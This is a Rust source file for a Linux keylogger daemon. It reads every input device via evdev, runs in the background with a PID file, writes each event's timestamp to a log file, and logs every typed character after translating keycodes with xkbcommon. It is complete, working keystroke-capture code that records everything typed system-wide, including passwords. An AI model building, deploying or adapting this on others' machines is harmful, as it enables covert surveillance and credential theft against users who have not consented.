use std::{
    io::{Read, Write},
    process::exit,
    time::UNIX_EPOCH,
};

use anyhow::{bail, Context, Result};
use daemonize::{Daemonize, Outcome};
use evdev::{Device, EventType, InputEvent, InputEventKind};
use log::{debug, error, info, trace};
use rustix::process::{kill_process, Pid, RawPid, Signal};
use tokio::{
    sync::mpsc::{self, Receiver},
    task::JoinSet,
};
use xkbcommon::xkb::{self, Keycode, State, CONTEXT_NO_FLAGS};

const PID_FILE_PATH: &str = "/run/keylogger.pid";

/// Creates keylogger daemon service. Will fork off a process and calls [`start()`]
///
/// # Errors
///
/// This function will return an error if daemon creation failed.
pub fn create(log_file: std::fs::File) -> Result<()> {
    let daemonizer = Daemonize::new().pid_file(PID_FILE_PATH);

    match daemonizer.execute() {
        Outcome::Parent(res) => {
            res.context("Failed to start daemon")?;
        }
        Outcome::Child(res) => {
            if let Err(err) = res.context("Daemon failed to start") {
                error!("{:?}", err);
            } else {
                debug!("Daemon started succesfully");
                if let Err(err) = start(log_file) {
                    error!("{err:?}");
                }
            }
            exit(1);
        }
    }

    Ok(())
}

/// Starts keylogger in current process, does not return unless a fatal error occurred.
///
/// # Errors
///
/// Returns if any part of the keylogger encountered a fatal error.
pub fn start(log_file: std::fs::File) -> Result<()> {
    tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .context("Failed to initiate tokio runtime")?
        .block_on(async { start_logger(log_file).await })
}

async fn start_logger(log_file: std::fs::File) -> Result<()> {
    trace!("keylogger starting");
    let devices: Vec<Device> = evdev::enumerate().map(|t| t.1).collect();

    if devices.is_empty() {
        bail!("Coundn't find any device. Missing sudo?");
    }
    trace!("Found {} devices", devices.len());

    let (rx, mut join_set) = spawn_device_listeners(devices);

    join_set.spawn_blocking(move || event_reader(rx, log_file));

    if let Some(result) = join_set.join_next().await {
        result??;
    }

    bail!("Unkown error occured");
}

fn get_keyboard_state() -> Result<State> {
    let context = xkb::Context::new(CONTEXT_NO_FLAGS);

    let keymap = xkb::Keymap::new_from_names(
        &context,
        "",                                       // rules
        "pc105",                                  // model
        "us",                                     // layout
        "intl",                                   // variant
        Some("grp:win_space_toggle".to_string()), // options
        xkb::COMPILE_NO_FLAGS,
    )
    .context("Failed to create keymap")?;

    Ok(xkb::State::new(&keymap))
}

fn spawn_device_listeners(devices: Vec<Device>) -> (Receiver<InputEvent>, JoinSet<Result<()>>) {
    let (tx, rx) = mpsc::channel(32);
    let mut join_set = JoinSet::<Result<()>>::new();

    for device in devices {
        let tx = tx.clone();
        join_set.spawn(async move {
            let mut stream = device
                .into_event_stream()
                .context("Failed to create device stream")?;
            loop {
                let event = stream.next_event().await.context("Failed to read event")?;
                tx.send(event).await.context("Failed to send event")?;
            }
        });
    }

    (rx, join_set)
}

fn event_reader(mut rx: Receiver<InputEvent>, mut log_file: std::fs::File) -> Result<()> {
    let state: State = get_keyboard_state().context("Failed to initialize keyboard state")?;

    while let Some(eventr) = rx.blocking_recv() {
        let time = eventr.timestamp();
        let t = time
            .duration_since(UNIX_EPOCH)
            .context("UNIX_EPOCHE is after the timestamp of the event???")?
            .as_nanos();
        log_file
            .write_all(format!("{t}\n").as_bytes())
            .context("Failed to write to log")?;
        if eventr.event_type() != EventType::KEY {
            continue;
        }
        // We add 8 to translate the linux keycode to the xkb keycode. Why? because it works.
        // Why???? For historical reasons
        // <https://xkbcommon.org/doc/current/keymap-text-format-v1.html#autotoc_md26>
        // THE FUCK
        let keycode = Keycode::new(u32::from(eventr.code()) + 8);
        trace!("{keycode:?}");
        let key = state.key_get_utf8(keycode);
        trace!("{eventr:?}");
        info!("{key:?}");
    }
    bail!("Event receiver was closed")
}

const INVALID_CONTENT: &str = "Failed to parse pid from file";

/// Sends the daemon SIGINT to kill it.
/// # Errors
///
/// This function will return an error if any part of the process doesn't succeed
pub fn stop() -> Result<()> {
    let mut file = std::fs::File::open(PID_FILE_PATH)?;

    if rustix::fs::flock(&file, rustix::fs::FlockOperation::NonBlockingLockExclusive).is_ok() {
        bail!("Daemon is not running");
    }

    let mut file_string = String::new();
    file.read_to_string(&mut file_string)
        .context(INVALID_CONTENT)?;
    let file_string = file_string.trim();
    info!("Read file content: {file_string}");
    let raw_pid = RawPid::from_str_radix(file_string, 10).context(INVALID_CONTENT)?;
    let pid = Pid::from_raw(raw_pid).context(INVALID_CONTENT)?;
    debug!("Read pid from file: {pid:?}");

    kill_process(pid, Signal::Int).context("Failed to kill process")?;

    Ok(())
}
